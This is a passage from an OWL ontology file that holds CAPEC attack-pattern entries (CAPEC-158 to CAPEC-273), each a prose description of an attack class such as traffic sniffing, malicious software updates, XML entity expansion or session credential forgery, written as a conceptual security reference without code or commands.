        rdfs:comment "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-158

    Annotations: 
        rdfs:comment "In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-159

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-16

    Annotations: 
        rdfs:comment "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-162

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the server, which processes the modified data. For example, eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the adversary to acquire items at a lower cost than the merchant intended. The adversary performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-168

    Annotations: 
        rdfs:comment "An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple \"files\" to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-17

    Annotations: 
        rdfs:comment "An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-175

    Annotations: 
        rdfs:comment "An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-180

    Annotations: 
        rdfs:comment "An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, \"Accessing Functionality Not Properly Constrained by ACLs\" in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-182

    Annotations: 
        rdfs:comment "An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-184

    Annotations: 
        rdfs:comment "An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-185

    Annotations: 
        rdfs:comment "An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-186

    Annotations: 
        rdfs:comment "An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an attacker controlled source. Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an attacker to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity. As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source. Virtually all software requires frequent updates or patches, giving the attacker immense latitude when structuring the attack, as well as many targets of opportunity. Attacks involving malicious software updates can be targeted or untargeted in reference to a population of users, and can also involve manual and automatic means of payload installation. Untargeted attacks rely upon a mass delivery system such as spamming, phishing, or trojans/botnets to distribute emails or other messages to vast populations of users. Targeted attacks aim at a particular demographic or user population. Corporate Facebook or Myspace pages make it easy to target users of a specific company or affiliation without relying on email address harvesting or spamming. One phishing-assisted variation on this attack involves hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update. This type of attack has also been conducted using an Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update. While both methods involve a high degree of automated mechanisms to support the attack, the primary vector for achieving the installation of the update remains a manual user-directed process, although clicking a link within an IM client or web application may initiate the update. Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system. Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-187

    Annotations: 
        rdfs:comment "An attacker exploits a weakness in a server or client's process of delivering and verifying the integrity of code supplied by an update-providing server or mechanism to cause code of the attackers' choosing to be downloaded and installed as a software update. Attacks against automated update mechanisms involve attack vectors which are specific to the type of update mechanism, but typically involve two different attack strategies: redirection or spoofing. Redirection-based attacks exploit two layers of weaknesses in server or client software to undermine the integrity of the target code-base. The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update. One predominate type of redirection attack requires DNS spoofing or hijacking of a domain name corresponding to an update server. The target software initiates an update request and the DNS request resolves the domain name of the update server to the IP address of the attacker, at which point the software accepts updates either transmitted by or pulled from the attackers' server. Attacks against DNS mechanisms comprise an initial phase of a chain of attacks that facilitate automated update hijacking attack, and such attacks have a precedent in targeted activities that have been as complex as DNS/BIND attacks of corporate infrastructures, to untargeted attacks aimed at compromising home broadband routers, as well as attacks involving the compromise of wireless access points, as well as 'evil twin' attacks coupled with DNS redirection. Due to the plethora of options open to the attacker in forcing name resolution to arbitrary servers the Automated Update Hijacking attack strategies are the tip of the spear for many multi-stage attack chains. The second weakness that is exploited by the attacker is the lack of integrity checking by the software in validating the update. Software which relies only upon domain name resolution to establish the identity of update code is particularly vulnerable, because this signals an absence of other security countermeasures that could be applied to invalidate the attackers' payload on basis of code identity, hashing, signing, encryption, and other integrity checking mechanisms. Redirection-based attack patterns work equally well against client-side software as well as local servers or daemons that provide software update functionality. One precedent of redirection-based attacks involves the active exploitation of Firefox extensions, such as the Google Toolbar, Yahoo Toolbar, Facebook Toolbar, and others. The second strategy employed in Automated Hijacking Attacks are spoofing strategies, including content or identity spoofing, as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. Such attacks have numerous precedents, one in particular being eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-19

    Annotations: 
        rdfs:comment "Embedding Scripts within Scripts."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-190

    Annotations: 
        rdfs:comment "An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable.

Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, inter-process communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-191

    Annotations: 
        rdfs:comment "An adversary engages in activities to discover any sensitive strings are present within the compiled code of an executable, such as literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis.

One specific example of a sensitive string is a hard-coded password. Typical examples of software with hard-coded passwords include server-side executables which may check for a hard-coded password or key during a user's authentication with the server. Hard-coded passwords can also be present in client-side executables which utilize the password or key when connecting to either a remote component, such as a database server, licensing server, or otherwise, or a processes on the same host that expects a key or password.

When analyzing an executable the adversary may search for the presence of such strings by analyzing the byte-code of the file itself. Example utilities for revealing strings within a file include 'strings,' 'grep,' or other variants of these programs depending upon the type of operating system used. These programs can be used to dump any ASCII or UNICODE strings contained within a program. Strings can also be searched for using a hex editors by loading the binary or object code file and utilizing native search functions such as regular expressions."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-192

    Annotations: 
        rdfs:comment "An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network. Although certain techniques for protocol analysis benefit from manipulating live 'on-the-wire' interactions between communicating components, static or dynamic analysis techniques applied to executables as well as to device drivers, such as network interface drivers, can also be used to reveal the function and characteristics of a communication protocol implementation. Depending upon the methods used the process may involve observing, interacting, and modifying actual communications occurring between hosts. The goal of protocol analysis is to derive the data transmission syntax, as well as to extract the meaningful content, including packet or content delimiters used by the protocol. This type of analysis is often performed on closed-specification protocols, or proprietary protocols, but is also useful for analyzing publicly available specifications to determine how particular implementations deviate from published specifications."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-193

    Annotations: 
        rdfs:comment "In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized \"include\" or \"require\" call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-194

    Types: 
        CAPECEntries
    
    
Individual: CAPEC-196

    Annotations: 
        rdfs:comment "An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-197

    Annotations: 
        rdfs:comment "An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-20

    Annotations: 
        rdfs:comment "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-201

    Annotations: 
        rdfs:comment "An attacker creates an XML document that contains an external entity reference. External entity references can take the form of <!ENTITY name system \"uri\"> tags in a DTD. Because processors may not validate documents with external entities, there may be no checks on the nature of the reference in the external entity. This can allow an attacker to open arbitrary files or connections."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-202

    Annotations: 
        rdfs:comment "An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures. For example, servers may assume that clients will accurately compute values (such as prices), will send correctly structured messages, and will attempt to ensure efficient interactions with the server. By reverse-engineering a client and creating their own version, an adversary can take advantage of these assumptions to abuse service functionality. For example, a purchasing service might send a unit price to its client and expect the client to correctly compute the total cost of a purchase. If the adversary uses a malicious client, however, the adversary could ignore the server input and declare any total price. Likewise, an adversary could configure the client to retain network or other server resources for longer than legitimately necessary in order to degrade server performance. Even services with general clients can be susceptible to this attack if they assume certain client behaviors. However, such services generally can make fewer assumptions about the behavior of their clients in the first place and, as such, are less likely to make assumptions that an adversary can exploit."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-203

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-204

    Annotations: 
        rdfs:comment "An attacker examines a target application's cache for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-206

    Annotations: 
        rdfs:comment "The attacker extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the attacker has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the attacker to execute arbitrary code on the victim's computer."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-207

    Annotations: 
        rdfs:comment "An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-208

    Annotations: 
        rdfs:comment "An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-209

    Annotations: 
        rdfs:comment "An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-21

    Annotations: 
        rdfs:comment "Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so.

Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes \"trust\" other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points.

Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers.

The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-214

    Annotations: 
        rdfs:comment "An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes any stack traces produced by error messages. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to cause the targeted application to return an error including a stack trace, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. The stack trace enumerates the chain of methods that led up to the point where the error was encountered. This can not only reveal the names of the methods (some of which may have known weaknesses) but possibly also the location of class files and libraries as well as parameter values. In some cases, the stack trace might even disclose sensitive configuration or user information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-215

    Annotations: 
        rdfs:comment "Fuzzing and observing application log data/errors for application mapping."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-217

    Annotations: 
        rdfs:comment "An adversary takes advantage of incorrectly configured SSL communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-218

    Annotations: 
        rdfs:comment "An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-219

    Annotations: 
        rdfs:comment "An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-22

    Annotations: 
        rdfs:comment "An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-220

    Annotations: 
        rdfs:comment "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-221

    Annotations: 
        rdfs:comment "This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-225

    Annotations: 
        rdfs:comment "An attacker actively targets exploitation of weaknesses, limitations and assumptions in the mechanisms a target utilizes to manage identity and authentication as well as manage access to its resources or authorize functionality. Such exploitation can lead to the complete subversion of any trust the target system may have in the identity of any entity with which it interacts, or the complete subversion of any control the target has over its data or functionality. Weaknesses targeted by subversion of authentication mechanisms are often due to assumptions and overconfidence in the strength or rigor of the implemented authentication mechanisms. Weaknesses targeted by subversion of authorization controls are often due to three primary factors: 1) a fundamental dependence on authentication mechanisms being effective; 2) a lack of effective control over the separation of privilege between various entities; and 3) assumptions and over confidence in the strength or rigor of the implemented authorization mechanisms."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-226

    Annotations: 
        rdfs:comment "An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-229

    Annotations: 
        rdfs:comment "This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-23

    Annotations: 
        rdfs:comment "An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:\\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-230

    Annotations: 
        rdfs:comment "Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. By nesting XML data and causing this data to be continuously self-referential, an attacker can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization. An attacker's goal is to leverage parser failure to his or her advantage. In most cases this type of an attack will result in a denial of service due to an application becoming unstable, freezing, or crash. However it may be possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.230.1]."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-231

    Annotations: 
        rdfs:comment "Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. By supplying oversized payloads in input vectors that will be processed by the XML parser, an attacker can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization, and potentially cause execution of arbitrary code. An attacker's goal is to leverage parser failure to his or her advantage. In many cases this type of an attack will result in a denial of service due to an application becoming unstable, freezing, or crash. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.231.1]."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-234

    Annotations: 
        rdfs:comment "An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-236

    Annotations: 
        rdfs:comment "Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-24

    Annotations: 
        rdfs:comment "In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-240

    Annotations: 
        rdfs:comment "An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-242

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-248

    Annotations: 
        rdfs:comment "An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-250

    Annotations: 
        rdfs:comment "An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-253

    Annotations: 
        rdfs:comment "The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-26

    Annotations: 
        rdfs:comment "The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by \"running the race\", modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with his version and cause the system to read the malicious file."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-267

    Annotations: 
        rdfs:comment "An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-271

    Annotations: 
        rdfs:comment "An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-273

    Annotations: 
